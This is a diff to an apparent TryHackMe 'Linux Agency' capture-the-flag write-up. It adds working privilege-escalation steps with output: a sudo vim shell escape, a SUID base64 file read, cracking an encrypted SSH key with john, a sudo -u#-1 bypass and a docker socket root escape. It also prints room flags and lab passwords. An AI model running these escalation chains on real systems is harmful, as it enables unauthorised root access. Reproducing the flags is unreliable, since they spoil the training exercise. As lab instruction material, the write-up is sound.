@@ -6,6 +6,8 @@ tags:
   - writeup
   - tryhackme
   - linux
+  - docker
+  - local ssh
 ---
 This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.
 
@@ -354,14 +356,14 @@ This Room will help you to sharpen your Linux Skills and help you to learn basic
 
 - What is the mission22 flag?
 
-```bash
-mission20@linuxagency:~$ su mission21
-Password: 
-$ ls
-ls: cannot open directory '.': Permission denied
-$ bash -i
-mission22{24caa74eb0889ed6a2e6984b42d49aaf}
-```
+    ```bash
+    mission20@linuxagency:~$ su mission21
+    Password: 
+    $ ls
+    ls: cannot open directory '.': Permission denied
+    $ bash -i
+    mission22{24caa74eb0889ed6a2e6984b42d49aaf}
+    ```
 
 - What is the mission23 flag?
 
@@ -793,21 +795,270 @@ mission22{24caa74eb0889ed6a2e6984b42d49aaf}
     ```
 
 - What is sean's flag?
-```bash
-ken@linuxagency:~$ sudo -l
-sudo -l
-Matching Defaults entries for ken on localhost:
-    env_reset, env_file=/etc/sudoenv, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-User ken may run the following commands on localhost:
-    (sean) NOPASSWD: /usr/bin/vim
-ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/sh'
-sudo -u sean vim -c ':!/bin/sh'
+    ```bash
+    ken@linuxagency:~$ sudo -l
+    sudo -l
+    Matching Defaults entries for ken on localhost:
+        env_reset, env_file=/etc/sudoenv, mail_badpass,
+        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
-$ python3 -c 'import pty;pty.spawn("/bin/bash")'
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-bash: /home/ken/.bashrc: Permission denied
-sean@linuxagency:~$
-```
+    User ken may run the following commands on localhost:
+        (sean) NOPASSWD: /usr/bin/vim
+    ken@linuxagency:~$ sudo -u sean vim -c ':!/bin/sh'
+    sudo -u sean vim -c ':!/bin/sh'
 
+    $ python3 -c 'import pty;pty.spawn("/bin/bash")'
+    python3 -c 'import pty;pty.spawn("/bin/bash")'
+    bash: /home/ken/.bashrc: Permission denied
+    sean@linuxagency:/tmp/shop$ id
+    id
+    uid=1037(sean) gid=1037(sean) groups=1037(sean),4(adm)
+
+    ## We are in the group adm, so we can view some logs.
+    sean@linuxagency:/var/log$ grep -s "sean" *
+    grep -s "sean" *
+    auth.log:Jan 31 03:14:31 localhost sudo:      ken : TTY=pts/4 ; PWD=/tmp/shop ; USER=sean ; COMMAND=/usr/bin/vim -c :!/bin/sh
+    auth.log:Jan 31 03:14:31 localhost sudo: pam_unix(sudo:session): session opened for user sean by (uid=0)
+    auth.log:Jan 31 03:15:00 localhost sudo: pam_unix(sudo:auth): authentication failure; logname= uid=1037 euid=0 tty=/dev/pts/4 ruser=sean rhost=  user=sean
+    auth.log:Jan 31 03:15:06 localhost sudo:     sean : command not allowed ; TTY=pts/4 ; PWD=/tmp/shop ; USER=root ; COMMAND=list
+    syslog.bak:Jan 12 02:58:58 ubuntu kernel: [    0.000000] ACPI: LAPIC_NMI (acpi_id[0x6d] high edge lint[0x1]) : sean{4c5685f4db7966a43cf8e95859801281} VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==
+
+    ## Let's decode the base64 string we got
+    $ echo "VGhlIHBhc3N3b3JkIG9mIHBlbmVsb3BlIGlzIHAzbmVsb3BlCg==" | base64 -d     
+    The password of penelope is p3nelope
+    ```
+
+- What is penelope's flag?
+
+    ```bash
+    penelope@linuxagency:~$ ls -la
+    total 80
+    drwxr-x---  3 penelope penelope  4096 Jan 12 08:32 .
+    drwxr-xr-x 45 root     root      4096 Jan 12 04:02 ..
+    -rwsr-sr-x  1 maya     maya     39096 Jan 12 04:02 base64
+    lrwxrwxrwx  1 penelope penelope     9 Jan 12 04:02 .bash_history -> /dev/null
+    -rw-r--r--  1 penelope penelope   220 Jan 12 04:02 .bash_logout
+    -rw-r--r--  1 penelope penelope  3771 Jan 12 04:02 .bashrc
+    -rw-r--r--  1 penelope penelope  8980 Jan 12 04:02 examples.desktop
+    -r--------  1 penelope penelope    43 Jan 12 04:02 flag.txt
+    drwx------  3 penelope penelope  4096 Jan 12 08:32 .gnupg
+    -rw-r--r--  1 penelope penelope   807 Jan 12 04:02 .profile
+
+    penelope@linuxagency:~$ cat flag.txt 
+    penelope{2da1c2e9d2bd0004556ae9e107c1d222}
+    ```
+
+- What is maya's flag?
+
+    ```bash
+    penelope@linuxagency:~$ ls -la
+    total 80
+    drwxr-x---  3 penelope penelope  4096 Jan 12 08:32 .
+    drwxr-xr-x 45 root     root      4096 Jan 12 04:02 ..
+    -rwsr-sr-x  1 maya     maya     39096 Jan 12 04:02 base64
+    lrwxrwxrwx  1 penelope penelope     9 Jan 12 04:02 .bash_history -> /dev/null
+    -rw-r--r--  1 penelope penelope   220 Jan 12 04:02 .bash_logout
+    -rw-r--r--  1 penelope penelope  3771 Jan 12 04:02 .bashrc
+    -rw-r--r--  1 penelope penelope  8980 Jan 12 04:02 examples.desktop
+    -r--------  1 penelope penelope    43 Jan 12 04:02 flag.txt
+    drwx------  3 penelope penelope  4096 Jan 12 08:32 .gnupg
+    -rw-r--r--  1 penelope penelope   807 Jan 12 04:02 .profile
+
+    ## Using base64 SUID
+    penelope@linuxagency:~$ ./base64 "/home/maya/flag.txt" | base64 --decode
+    maya{a66e159374b98f64f89f7c8d458ebb2b}
+    ```
+
+- What is robert's Passphrase?
+
+    ```bash
+    maya@linuxagency:~$ ls -la
+    total 52
+    drwxr-x---  5 maya maya 4096 Jan 15 07:31 .
+    drwxr-xr-x 45 root root 4096 Jan 12 04:02 ..
+    lrwxrwxrwx  1 maya maya    9 Jan 12 04:02 .bash_history -> /dev/null
+    -rw-r--r--  1 maya maya  220 Jan 12 04:02 .bash_logout
+    -rw-r--r--  1 maya maya 3771 Jan 12 04:02 .bashrc
+    -rw-r--r--  1 maya maya  519 Jan 12 10:51 elusive_targets.txt
+    -rw-r--r--  1 maya maya 8980 Jan 12 04:02 examples.desktop
+    -r--------  1 maya maya   39 Jan 12 04:02 flag.txt
+    drwxr-xr-x  3 maya maya 4096 Jan 12 04:02 .local
+    drwxr-xr-x  2 maya maya 4096 Jan 15 07:25 old_robert_ssh
+    -rw-r--r--  1 maya maya  807 Jan 12 04:02 .profile
+    drwx------  2 maya maya 4096 Jan 12 04:02 .ssh
+    maya@linuxagency:~$ cat elusive_targets.txt 
+    Welcome 47 glad you made this far.
+    You have made our Agency very proud.
+
+    But, we have a last unfinished job which is to infiltrate kronstadt industries.
+    He has a entrypoint at localhost.
+
+    Previously, Another agent tried to infiltrate kronstadt industries nearly 3 years back, But we failed.
+    Robert is involved to be illegally hacking into our server's.
+
+    He was able to transfer the .ssh folder from robert's home directory.
+
+    The old .ssh is kept inside old_robert_ssh directory incase you need it.
+
+    Good Luck!!!
+        47
+    maya@linuxagency:~$ cd old_robert_ssh/
+    maya@linuxagency:~/old_robert_ssh$ ls
+    id_rsa  id_rsa.pub
+    maya@linuxagency:~/old_robert_ssh$ cat id_rsa
+    -----BEGIN RSA PRIVATE KEY-----
+    Proc-Type: 4,ENCRYPTED
+    DEK-Info: AES-128-CBC,7903FE7BDBA051C4B0BF7C6C5C597E0B
+
+    iRzpH6qjXDvmVU5wwYU7TQfyQHIqYzR0NquznZ3OiXyaSOaovgPXdGP3r50vfIV6
+    i07H7ZSczz4nuenYJGIE7ZfDYtVVA9R6IdcIZecYF2L3OfHoR/ghGOlbLC+Hyvky
+    RMcrEgajpdV7zCPRHckiBioxzx1K7kfkinyiSBoV9pz9PuAKo47OHtKDdtjWFV+A
+    PkiWa8aCmAGShC9RZkZLMRhVkR0TZGOgJGTs/MncopyJJ6TgJ9AzHcQo3vcf5A3k
+    7f3+9Niw7mMFmWrU35WOBpAynGkK9eDTvt/DoIMJcT9KL1BBaEzReO8mETNqfT5G
+    QncO/4tBSG7QaU6pQkd+UiZCtltp47Tu9hwSEsxDIleespuBn9mDHrYtBDC8jEBq
+    nqm0sDdYOPzjUTMDSJgqmLZ0lzagTa1OMNUlvRAz5Sde4bKAoYRgVvBWJ4whn4H+
+    OIHhFQ6tbCVr/0tosYrc9ehM4N4TiJ0SyfrP1XmDo8bud+UtNf2Tf/vKjYT9FP+/
+    +HqrIn1ou4Cvvu/jPbwVU8Ejh4CX/TJhDK6JqLzsqOp0M8jBccCR+zrRXcZsKLnG
+    JUTqxKwML7FhRiAgeTmOUx43XVOvzrNOmZ+8EmbmE4fW5x9UKR2nzKgILwHApayK
+    dmKbym96uSoQOm4KycXjoDVw9nAgRQQVQ+3Ndy0JwuyXN7keNcesEN5hb5VNN9VP
+    jp+mS+c/CctyLSgZkGJif2r2N+3x2AZFkDs059sPQB8UGvI4w41qGBubfsHAvVPW
+    KH+HAgj1i1RM0/XZ5XKIl0K4iO/eQ5xTAPah51f6LCYnZo/G6fM7IT72k0Z0KMZ8
+    EiySGtRCcv7vrkVRjkgmw4lAeGLJ9FBOw8IdKa9ftYJauKY/E0Gs1Qhefl+3K2BB
+    4PJ+Pr/doZ3Dkq4Q/YPrKnbKEbs/3Zvbu/XT5y+joS6tzF3Raz6xW0kg3NyaA1B5
+    V5zoj0/tnBb9Lc0YH7s2QT+9drFH4w8tb5kjyd1jlER3Hs4m31cniCsxDlKoTwk/
+    uAGurW23NZ4QF+3/PgjZRhudpNjcOP69Ys2XGAecxO9uBx9JjPR/cn9c54v4s/kH
+    n6v24eXF2uGGlEsvEpzIpk6UDap7YoxnRKIPo0mZ5G7/MS9+RL6dv9rmJ6IQd7Cr
+    fPjhz8snqfuGCAVveKWIOPnlfYiYJ2nQ6yA1Soyt9outfLbwIzDh7e+eqaOP2amh
+    rGCqwxrj9cj4sH/MzvKZVARzH3hs39wRmoEtx9ML/uXsp22DqUODOxc7cdUlRs99
+    zTj8CHFpM6X+ihSF33Eg0qBJwkyWzdKQiFKNTm8ld4wzov1tdKeRC7nlUh5F4lkf
+    yExiUTllJq8pJ3JAC/LEvQXF041fcmQ0RvoL1n3nyqIvvOjuY7UDZrcmuWQ+epdE
+    APKzOgkxhEqsozt8kj810m3bjIWngenwRcGL6M1ZsvwT1YwGUKG47wX2Ze3tp3ge
+    K4NUD9GdZJIiu8qdpyMIFKR9MfM3Pur5JRUK0IjCD43xk9p6LZYK00C3N2F4exwM
+    Ye5kHYeqZLpl4ljZSBoNtEK1BbYSffBt2XdoQsAvft1iwjdtZ9E644oTp9QYjloE
+    -----END RSA PRIVATE KEY-----
+
+    ## Let's crack the passphrase
+    ┌──(kali㉿kali)-[~]
+    └─$ locate ssh2john                                                                                                                                                    127 ⨯
+    /usr/share/john/ssh2john.py
+                                                                                                                                                                                
+    ┌──(kali㉿kali)-[~]
+    └─$ python /usr/share/john/ssh2john.py id_rsa > id_rsa_new
+                                                                                                                                                                                
+    ┌──(kali㉿kali)-[~]
+    └─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_new
+    Using default input encoding: UTF-8
+    Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
+    Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+    Cost 2 (iteration count) is 1 for all loaded hashes
+    Will run 6 OpenMP threads
+    Note: This format may emit false positives, so it will keep trying even after
+    finding a possible candidate.
+    Press 'q' or Ctrl-C to abort, almost any other key for status
+    industryweapon   (id_rsa)
+    1g 0:00:00:02 DONE (2021-01-31 06:27) 0.4184g/s 6000Kp/s 6000Kc/s 6000KC/s     angelica..*7¡Vamos!
+    Session completed
+    ```
+
+- What is user.txt?
+
+    ```bash
+    ## Checking used port
+    maya@linuxagency:/home$ ss -tulw
+    Netid            State              Recv-Q             Send-Q                                Local Address:Port                                Peer Address:Port             
+    icmp6            UNCONN             0                  0                                            *%eth0:ipv6-icmp                                      *:*                
+    udp              UNCONN             0                  0                                           0.0.0.0:48661                                    0.0.0.0:*                
+    udp              UNCONN             9216               0                                     127.0.0.53%lo:domain                                   0.0.0.0:*                
+    udp              UNCONN             0                  0                                10.10.198.254%eth0:bootpc                                   0.0.0.0:*                
+    udp              UNCONN             0                  0                                           0.0.0.0:bootpc                                   0.0.0.0:*                
+    udp              UNCONN             0                  0                                           0.0.0.0:ipp                                      0.0.0.0:*                
+    udp              UNCONN             7680               0                                           0.0.0.0:mdns                                     0.0.0.0:*                
+    udp              UNCONN             0                  0                                              [::]:53644                                       [::]:*                
+    udp              UNCONN             41728              0                                              [::]:mdns                                        [::]:*                
+    tcp              LISTEN             0                  128                                       127.0.0.1:36035                                    0.0.0.0:*                
+    tcp              LISTEN             0                  128                                       127.0.0.1:2222                                     0.0.0.0:*                
+    tcp              LISTEN             0                  128                                       127.0.0.1:http                                     0.0.0.0:*                
+    tcp              LISTEN             0                  128                                   127.0.0.53%lo:domain                                   0.0.0.0:*                
+    tcp              LISTEN             0                  128                                         0.0.0.0:ssh                                      0.0.0.0:*                
+    tcp              LISTEN             0                  5                                         127.0.0.1:ipp                                      0.0.0.0:*                
+    tcp              LISTEN             0                  128                                            [::]:ssh                                         [::]:*                
+    tcp              LISTEN             0                  5                                             [::1]:ipp                                         [::]:*
+
+    ## Port 2222 open but at localhost, let's ssh using robert
+    maya@linuxagency:~/old_robert_ssh$ ssh -i id_rsa robert@127.0.0.1 -p 2222
+    robert@127.0.0.1's password: 
+    Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+    robert@ec96850005d6:~$ ls -la
+    total 24
+    drwxr-xr-x 2 robert robert 4096 Jan 12 18:49 .
+    drwxr-xr-x 1 root   root   4096 Jan 12 12:54 ..
+    lrwxrwxrwx 1 robert robert    9 Jan 12 17:02 .bash_history -> /dev/null
+    -rw-r--r-- 1 robert robert  220 Apr  4  2018 .bash_logout
+    -rw-r--r-- 1 robert robert 3771 Apr  4  2018 .bashrc
+    -rw-r--r-- 1 robert robert  807 Apr  4  2018 .profile
+    -rw-r--r-- 1 robert robert   78 Jan 12 18:49 robert.txt
+    robert@ec96850005d6:~$ cat robert.txt 
+    You shall not pass from here!!!
+
+    I will not allow ICA to take over my world.
+    robert@ec96850005d6:~$ sudo -l
+    Matching Defaults entries for robert on ec96850005d6:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User robert may run the following commands on ec96850005d6:
+        (ALL, !root) NOPASSWD: /bin/bash
+
+    ## We can use SUDO CVE
+    robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
+    root@ec96850005d6:~# cd /root 
+    root@ec96850005d6:/root# cat user.txt 
+    user{REDACTED}
+    ```
+
+- What is root.txt?
+
+    ```bash
+    robert@ec96850005d6:~$ ls -la /
+    total 84
+    drwxr-xr-x   1 root root 4096 Jan 12 12:50 .
+    drwxr-xr-x   1 root root 4096 Jan 12 12:50 ..
+    -rwxr-xr-x   1 root root    0 Jan 12 12:50 .dockerenv
+    drwxr-xr-x   1 root root 4096 Jan 12 12:51 bin
+    drwxr-xr-x   2 root root 4096 Apr 24  2018 boot
+    drwxr-xr-x   5 root root  360 Jan 31 11:01 dev
+    drwxr-xr-x   1 root root 4096 Jan 12 13:18 etc
+    drwxr-xr-x   1 root root 4096 Jan 12 12:54 home
+    drwxr-xr-x   1 root root 4096 Jan 12 12:43 lib
+    drwxr-xr-x   2 root root 4096 Nov 19 13:09 lib64
+    drwxr-xr-x   2 root root 4096 Nov 19 13:07 media
+    drwxr-xr-x   2 root root 4096 Nov 19 13:07 mnt
+    drwxr-xr-x   2 root root 4096 Nov 19 13:07 opt
+    dr-xr-xr-x 157 root root    0 Jan 31 11:01 proc
+    drwx------   1 root root 4096 Jan 12 18:48 root
+    drwxr-xr-x  27 root root  900 Jan 31 11:06 run
+    drwxr-xr-x   1 root root 4096 Jan 12 12:51 sbin
+    drwxr-xr-x   2 root root 4096 Nov 19 13:07 srv
+    dr-xr-xr-x  13 root root    0 Jan 31 11:50 sys
+    drwxrwxrwt   1 root root 4096 Jan 12 16:40 tmp
+    drwxr-xr-x   1 root root 4096 Nov 19 13:07 usr
+    drwxr-xr-x   1 root root 4096 Nov 19 13:09 var
+
+    ## There is .dockerenv, so we are now in docker environment. Let's change the docker permission.
+    root@ec96850005d6:~# sudo chmod 666 /var/run/docker.sock
+
+    ## Go back to maya's user
+    maya@linuxagency:~$ docker images
+    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
+    mangoman            latest              b5f279024ce0        2 weeks ago         213MB
+
+    ## Privesc
+    maya@linuxagency:~$ docker run -v /:/mnt --rm -it mangoman chroot /mnt sh
+    # whoami
+    root
+    # cd /root
+    # ls
+    message.txt  root.txt
+    # cat root.txt
+    root{REDACTED}
+    ```
